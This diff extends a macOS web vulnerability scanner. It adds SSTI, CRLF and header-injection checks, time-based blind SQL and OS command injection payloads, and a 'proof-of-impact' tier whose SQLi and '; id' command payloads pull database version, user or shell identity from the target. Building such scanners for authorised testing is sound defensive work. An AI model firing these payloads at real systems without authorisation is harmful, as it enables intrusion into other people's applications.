@@ -4318,7 +4318,9 @@ private enum NativeWebScanner {
         var scanJsSecrets = false    // 1: scan JS bundles for leaked secrets
         var ingestSitemap = false    // 2: enqueue robots.txt / sitemap.xml URLs
         var probePaths = false       // 3: probe well-known sensitive paths
-        var active = false           // active verification (XSS/SQLi/open-redirect payloads)
+        var active = false           // active verification (XSS/SQLi/SSTI/CRLF/redirect payloads)
+        var intrusive = false        // time-based blind SQLi / OS command injection (staging only)
+        var exploit = false          // proof-of-impact: one read-only evidence value per confirmed class
         var compareUnauth = false    // access-control: compare authed vs unauthenticated
         var secondaryHeaders: [String: String] = [:]  // access-control: second account
 
@@ -5070,6 +5072,120 @@ private enum NativeWebScanner {
         "returnto", "return_to", "dest", "destination", "continue", "redir", "goto", "u", "r",
     ]
     private static let activeOOBHost = "koda-open-redirect.example"
+    // SSTI: each payload targets a different template syntax; all share the same
+    // inner expression so one check (result present, literal absent) covers them.
+    private static let sstiExpr = "1337*1337"
+    private static let sstiResult = "1787569"
+    private static let sstiPayloads = ["{{1337*1337}}", "${1337*1337}", "<%= 1337*1337 %>", "#{1337*1337}"]
+    private static let injectableHeaders = ["Referer", "X-Forwarded-For"]
+    // Intrusive time-delay payloads: {n} is the delay in seconds. Benign sleep
+    // proof only — no data-altering payloads.
+    private static let sqlTimePayloads = ["' AND SLEEP(%d)-- -", "'||pg_sleep(%d)--", "';WAITFOR DELAY '0:0:%d'--", "1 AND SLEEP(%d)"]
+    private static let cmdTimePayloads = ["; sleep %d", "| sleep %d", "$(sleep %d)", "`sleep %d`"]
+    // Proof-of-impact (exploit): one read-only evidence value per class, then stop.
+    private static let sqlProofPayloads = [
+        "' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -",
+        "' AND extractvalue(1,concat(0x7e,current_user(),0x7e))-- -",
+        "' AND 1=cast(version() as int)-- -",
+        "' AND 1=convert(int,@@version)-- -",
+    ]
+    private static let cmdProofPayloads = ["; id", "| id", "$(id)", "`id`"]
+    private static let sstiProof: [(String, String)] = [
+        ("{{31337-1}}", "Jinja2/Twig/Nunjucks ({{...}})"),
+        ("${31337-1}", "Freemarker/JSP-EL (${...})"),
+        ("<%= 31337-1 %>", "ERB/JSP (<%= %>)"),
+        ("#{31337-1}", "Ruby/EL (#{...})"),
+    ]
+
+    /// True when the SSTI product appears but its literal does not (evaluated, not echoed).
+    private static func sstiEvaluated(_ body: String) -> Bool {
+        body.contains(sstiResult) && !body.contains(sstiExpr)
+    }
+
+    /// True when `marker` is reflected inside an inline <script> block.
+    private static func markerInScript(_ body: String, _ marker: String) -> Bool {
+        let lower = body.lowercased()
+        guard let idx = lower.range(of: marker.lowercased())?.lowerBound else { return false }
+        let before = String(lower[lower.startIndex ..< idx])
+        guard let open = before.range(of: "<script", options: .backwards)?.lowerBound else { return false }
+        if let close = before.range(of: "</script>", options: .backwards)?.lowerBound {
+            return close < open
+        }
+        return true
+    }
+
+    private static let cmdIdRegex = try? NSRegularExpression(pattern: "uid=\\d+\\([\\w.$-]+\\)\\s+gid=\\d+\\([\\w.$-]+\\)")
+    private static let sqlProofRegex = try? NSRegularExpression(
+        pattern: "~([^~<\\n]{2,80})~|(PostgreSQL \\d[\\w.]*|Microsoft SQL Server[^\\n<]{0,40}|MariaDB-[\\w.]+|\\d+\\.\\d+\\.\\d+[-\\w.]*)",
+        options: [.caseInsensitive]
+    )
+
+    private static func firstMatch(_ regex: NSRegularExpression?, in text: String) -> String? {
+        guard let regex,
+              let match = regex.firstMatch(in: text, range: NSRange(text.startIndex..., in: text)),
+              let range = Range(match.range, in: text) else { return nil }
+        return String(text[range])
+    }
+
+    /// Wall-clock seconds for one GET, or nil if it failed.
+    private static func timedProbe(
+        _ url: URL, session: URLSession, options: Options, jar: CookieJar, timeout: TimeInterval
+    ) async -> Double? {
+        let start = Date()
+        guard await probeBody(url, session: session, options: options, jar: jar, timeout: timeout) != nil else { return nil }
+        return Date().timeIntervalSince(start)
+    }
+
+    /// True when response time tracks an injected delay across repeated samples.
+    /// `elapsed(sec)` sends a payload asking for `sec` seconds of delay.
+    private static func delayConfirms(big: Int, small: Int, elapsed: (Int) async -> Double?) async -> Bool {
+        guard let base = await elapsed(0) else { return false }
+        guard let hi = await elapsed(big), (hi - base) >= Double(big) * 0.6 else { return false }
+        guard let lo = await elapsed(small),
+              Double(small) * 0.5 <= (lo - base), (lo - base) < (hi - base) + 1.0 else { return false }
+        guard let hi2 = await elapsed(big) else { return false }
+        return (hi2 - base) >= Double(big) * 0.6
+    }
+
+    /// Response headers (lower-cased keys) for one GET, or nil on failure.
+    private static func probeResponseHeaders(
+        _ url: URL, session: URLSession, options: Options, jar: CookieJar, timeout: TimeInterval
+    ) async -> [String: String]? {
+        var request = URLRequest(url: url)
+        request.timeoutInterval = timeout
+        request.httpShouldHandleCookies = false
+        request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
+        applyAuthHeaders(to: &request, jar: jar, options: options)
+        do {
+            let (_, response) = try await session.data(for: request)
+            guard let http = response as? HTTPURLResponse else { return nil }
+            var headers: [String: String] = [:]
+            for (key, value) in stringHeaders(http.allHeaderFields) {
+                headers[key.lowercased()] = value
+            }
+            return headers
+        } catch {
+            return nil
+        }
+    }
+
+    /// GET with one extra request header, returning the body — for header injection.
+    private static func probeBody(
+        _ url: URL, extraHeader: (String, String), session: URLSession, options: Options, jar: CookieJar, timeout: TimeInterval
+    ) async -> String? {
+        var request = URLRequest(url: url)
+        request.timeoutInterval = timeout
+        request.httpShouldHandleCookies = false
+        request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
+        applyAuthHeaders(to: &request, jar: jar, options: options)
+        request.setValue(extraHeader.1, forHTTPHeaderField: extraHeader.0)
+        do {
+            let (data, _) = try await session.data(for: request)
+            return String(decoding: data.prefix(2 * 1024 * 1024), as: UTF8.self)
+        } catch {
+            return nil
+        }
+    }
 
     /// Send bounded, non-destructive attack payloads to a URL's query params and
     /// verify reflected XSS / error-based SQLi / open redirect from the response.
@@ -5086,13 +5202,48 @@ private enum NativeWebScanner {
 
             // Reflected XSS: unique marker (no single quote) reflected unencoded.
             let marker = "koda\(token)\"><kdx>"
+            var reflected = false
             if let target = withQueryParam(url, name, marker),
                let body = await probeBody(target, session: session, options: options, jar: jar, timeout: timeout),
                body.contains(marker) {
+                reflected = true
                 findings.append(finding("web.reflected-xss-verified", "medium",
                     "입력값이 인코딩되지 않고 반사됨 — XSS 실행 가능성 수동 확인 필요", url.absoluteString,
                     evidence: "param '\(name)': 마커가 인코딩 없이 반사됨",
                     recommendation: "출력 시 컨텍스트 인코딩을 적용하고 엄격한 CSP를 설정하세요."))
+            }
+            // JS-context XSS: a plain alnum marker that lands inside <script>.
+            if !reflected {
+                let jsMarker = "koda\(token)jsx"
+                if let target = withQueryParam(url, name, jsMarker),
+                   let body = await probeBody(target, session: session, options: options, jar: jar, timeout: timeout),
+                   markerInScript(body, jsMarker) {
+                    findings.append(finding("web.xss-js-context", "medium",
+                        "반사된 입력이 인라인 <script> 블록 안에 위치함 (JS 컨텍스트 XSS)", url.absoluteString,
+                        evidence: "param '\(name)': 값이 인라인 JavaScript 안에서 반사됨",
+                        recommendation: "사용자 입력을 인라인 스크립트에 넣지 말고 JSON·HTML 인코딩하며 엄격한 CSP를 설정하세요."))
+                }
+            }
+            // SSTI: template expressions that only resolve if evaluated server-side.
+            for payload in sstiPayloads {
+                if let target = withQueryParam(url, name, payload),
+                   let body = await probeBody(target, session: session, options: options, jar: jar, timeout: timeout),
+                   sstiEvaluated(body) {
+                    findings.append(finding("web.ssti-verified", "high",
+                        "입력의 템플릿 표현식이 서버에서 평가됨 (SSTI)", url.absoluteString,
+                        evidence: "param '\(name)': \(payload) -> \(sstiResult)",
+                        recommendation: "사용자 입력을 템플릿으로 렌더링하지 말고 샌드박스 엔진에 데이터로 전달하세요."))
+                    break
+                }
+            }
+            // CRLF / HTTP response-header injection.
+            if let target = withQueryParam(url, name, "koda\(token)\r\nX-Koda-CRLF: \(token)"),
+               let headers = await probeResponseHeaders(target, session: session, options: options, jar: jar, timeout: timeout),
+               headers["x-koda-crlf"] == token {
+                findings.append(finding("web.crlf-injection", "high",
+                    "CRLF / HTTP 응답 헤더 삽입 (삽입한 헤더가 응답에 나타남)", url.absoluteString,
+                    evidence: "param '\(name)': 삽입한 CR/LF가 응답에 X-Koda-CRLF 헤더를 추가함",
+                    recommendation: "응답 헤더에 넣는 값에서 CR/LF를 제거하고 헤더 값을 인코딩하는 프레임워크 API를 사용하세요."))
             }
 
             // Error-based SQL injection: a trailing quote provokes a DB error.
@@ -5128,6 +5279,97 @@ private enum NativeWebScanner {
                     "리다이렉트 파라미터가 외부 사이트로 보냄(검증된 오픈 리다이렉트)", url.absoluteString,
                     evidence: "param '\(name)' -> Location: \(location)",
                     recommendation: "리다이렉트 대상은 상대 경로 또는 허용 목록만 허용하세요."))
+            }
+
+            // Intrusive tier: blind detection by response timing.
+            if options.intrusive {
+                let big = min(6, max(3, Int(timeout) - 2))
+                let small = max(1, big / 3)
+                for tmpl in sqlTimePayloads {
+                    let confirmed = await delayConfirms(big: big, small: small) { sec in
+                        guard let target = withQueryParam(url, name, String(format: tmpl, sec)) else { return nil }
+                        return await timedProbe(target, session: session, options: options, jar: jar, timeout: timeout)
+                    }
+                    if confirmed {
+                        findings.append(finding("web.sql-injection-time-blind", "high",
+                            "시간 기반 블라인드 SQL Injection (응답 지연이 주입한 sleep에 비례)", url.absoluteString,
+                            evidence: "param '\(name)': 주입한 SQL sleep에 따라 응답 시간이 증가함",
+                            recommendation: "파라미터화 쿼리/프리페어드 스테이트먼트를 사용하세요."))
+                        break
+                    }
+                }
+                for tmpl in cmdTimePayloads {
+                    let confirmed = await delayConfirms(big: big, small: small) { sec in
+                        guard let target = withQueryParam(url, name, original + String(format: tmpl, sec)) else { return nil }
+                        return await timedProbe(target, session: session, options: options, jar: jar, timeout: timeout)
+                    }
+                    if confirmed {
+                        findings.append(finding("web.command-injection-time-blind", "critical",
+                            "OS 명령어 삽입 (응답 지연이 주입한 sleep 명령에 비례)", url.absoluteString,
+                            evidence: "param '\(name)': 주입한 셸 sleep에 따라 응답 시간이 증가함",
+                            recommendation: "사용자 입력을 셸에 전달하지 말고 인자 배열/안전 API와 허용목록을 사용하세요."))
+                        break
+                    }
+                }
+            }
+
+            // Proof-of-impact tier: one read-only evidence value per class.
+            if options.exploit {
+                for payload in sqlProofPayloads {
+                    if let target = withQueryParam(url, name, original + payload),
+                       let body = await probeBody(target, session: session, options: options, jar: jar, timeout: timeout),
+                       let proof = firstMatch(sqlProofRegex, in: body) {
+                        findings.append(finding("web.sql-injection-exploited", "critical",
+                            "데이터베이스 신원 값을 읽어 SQL Injection을 실증함", url.absoluteString,
+                            evidence: "param '\(name)': 읽기전용 SQLi 증거 '\(proof.prefix(80))'",
+                            recommendation: "파라미터화 쿼리/프리페어드 스테이트먼트를 사용하세요."))
+                        break
+                    }
+                }
+                for payload in cmdProofPayloads {
+                    if let target = withQueryParam(url, name, original + payload),
+                       let body = await probeBody(target, session: session, options: options, jar: jar, timeout: timeout),
+                       let out = firstMatch(cmdIdRegex, in: body) {
+                        findings.append(finding("web.command-injection-exploited", "critical",
+                            "무해한 명령(id) 실행으로 OS 명령어 삽입을 실증함", url.absoluteString,
+                            evidence: "param '\(name)': 주입한 id가 '\(out)' 반환",
+                            recommendation: "사용자 입력을 셸에 전달하지 말고 인자 배열/안전 API와 허용목록을 사용하세요."))
+                        break
+                    }
+                }
+                for (payload, engine) in sstiProof {
+                    if let target = withQueryParam(url, name, payload),
+                       let body = await probeBody(target, session: session, options: options, jar: jar, timeout: timeout),
+                       body.contains("31336"), !body.contains("31337-1") {
+                        findings.append(finding("web.ssti-exploited", "critical",
+                            "서버사이드 템플릿 인젝션 실증: 임의 식이 평가됨", url.absoluteString,
+                            evidence: "param '\(name)': 엔진 \(engine), 식 평가 확인",
+                            recommendation: "사용자 입력을 템플릿으로 렌더링하지 말고 샌드박스 엔진에 데이터로 전달하세요."))
+                        break
+                    }
+                }
+            }
+        }
+
+        // Injection via request headers (reflected XSS / SSTI), once per URL.
+        for headerName in injectableHeaders {
+            let xssMarker = "koda\(token)\"><kdx>"
+            if let body = await probeBody(url, extraHeader: (headerName, xssMarker), session: session, options: options, jar: jar, timeout: timeout),
+               body.contains(xssMarker) {
+                findings.append(finding("web.reflected-xss-verified", "medium",
+                    "입력값이 인코딩되지 않고 반사됨 — XSS 실행 가능성 수동 확인 필요", url.absoluteString,
+                    evidence: "request header '\(headerName)'가 마커를 인코딩 없이 반사함",
+                    recommendation: "출력 시 컨텍스트 인코딩을 적용하고 엄격한 CSP를 설정하세요."))
+            }
+            for payload in sstiPayloads {
+                if let body = await probeBody(url, extraHeader: (headerName, payload), session: session, options: options, jar: jar, timeout: timeout),
+                   sstiEvaluated(body) {
+                    findings.append(finding("web.ssti-verified", "high",
+                        "입력의 템플릿 표현식이 서버에서 평가됨 (SSTI)", url.absoluteString,
+                        evidence: "request header '\(headerName)': \(payload) -> \(sstiResult)",
+                        recommendation: "사용자 입력을 템플릿으로 렌더링하지 말고 샌드박스 엔진에 데이터로 전달하세요."))
+                    break
+                }
             }
         }
         return findings
@@ -6080,6 +6322,8 @@ private final class WebScanAccessoryView: NSView {
     private let sitemapCheck = NSButton(checkboxWithTitle: "", target: nil, action: nil)
     private let probeCheck = NSButton(checkboxWithTitle: "", target: nil, action: nil)
     private let activeCheck = NSButton(checkboxWithTitle: "", target: nil, action: nil)
+    private let intrusiveCheck = NSButton(checkboxWithTitle: "", target: nil, action: nil)
+    private let exploitCheck = NSButton(checkboxWithTitle: "", target: nil, action: nil)
     private let compareUnauthCheck = NSButton(checkboxWithTitle: "", target: nil, action: nil)
     private let secondaryField = NSTextField()
     private let loginURLField = NSTextField()
@@ -6119,8 +6363,16 @@ private final class WebScanAccessoryView: NSView {
         secretsCheck.title = ko ? "JS 번들에서 유출 시크릿 스캔" : "Scan JS bundles for leaked secrets"
         sitemapCheck.title = ko ? "robots.txt / sitemap.xml 수집" : "Ingest robots.txt / sitemap.xml"
         probeCheck.title = ko ? "민감 경로 프로브 (/.env, /.git ...)" : "Probe sensitive paths (/.env, /.git ...)"
-        activeCheck.title = ko ? "능동 검증 (XSS/SQLi/리다이렉트 — 권한 대상만)" : "Active verify (XSS/SQLi/redirect — authorized only)"
+        activeCheck.title = ko ? "능동 검증 (XSS/SQLi/SSTI/CRLF/리다이렉트 — 권한 대상만)" : "Active verify (XSS/SQLi/SSTI/CRLF/redirect — authorized only)"
+        intrusiveCheck.title = ko ? "침투 (블라인드 SQLi/RCE 타이밍 — staging만)" : "Intrusive (blind SQLi/RCE timing — staging only)"
+        exploitCheck.title = ko ? "영향 실증 (읽기전용 증거 1건 추출 — staging만)" : "Proof-of-impact (extract one read-only evidence value — staging only)"
         compareUnauthCheck.title = ko ? "접근통제 점검: 비인증과 비교" : "Access-control check: compare vs unauthenticated"
+        for extraCheck in [intrusiveCheck, exploitCheck] {
+            extraCheck.target = self
+            extraCheck.action = #selector(optionSelectionChanged(_:))
+        }
+        intrusiveCheck.identifier = NSUserInterfaceItemIdentifier("web-scan.intrusive")
+        exploitCheck.identifier = NSUserInterfaceItemIdentifier("web-scan.exploit")
         selectAllButton.identifier = NSUserInterfaceItemIdentifier("web-scan.select-all")
         for (check, identifier) in [
             (crawlCheck, "crawl"), (renderCheck, "render"), (assetsCheck, "assets"),
@@ -6160,6 +6412,8 @@ private final class WebScanAccessoryView: NSView {
             sitemapCheck,
             probeCheck,
             activeCheck,
+            intrusiveCheck,
+            exploitCheck,
             compareUnauthCheck,
             secondaryField,
             NSTextField(labelWithString: ko ? "추가 경로 (선택)" : "Extra routes (optional)"),
@@ -6210,6 +6464,9 @@ private final class WebScanAccessoryView: NSView {
         opts.ingestSitemap = sitemapCheck.state == .on
         opts.probePaths = probeCheck.state == .on
         opts.active = activeCheck.state == .on
+        // Intrusive requires active; proof-of-impact requires intrusive.
+        opts.intrusive = opts.active && intrusiveCheck.state == .on
+        opts.exploit = opts.intrusive && exploitCheck.state == .on
         opts.compareUnauth = compareUnauthCheck.state == .on
         opts.secondaryHeaders = Self.parseHeaders(secondaryField.stringValue)
         opts.loginURL = loginURLField.stringValue.trimmingCharacters(in: .whitespacesAndNewlines)
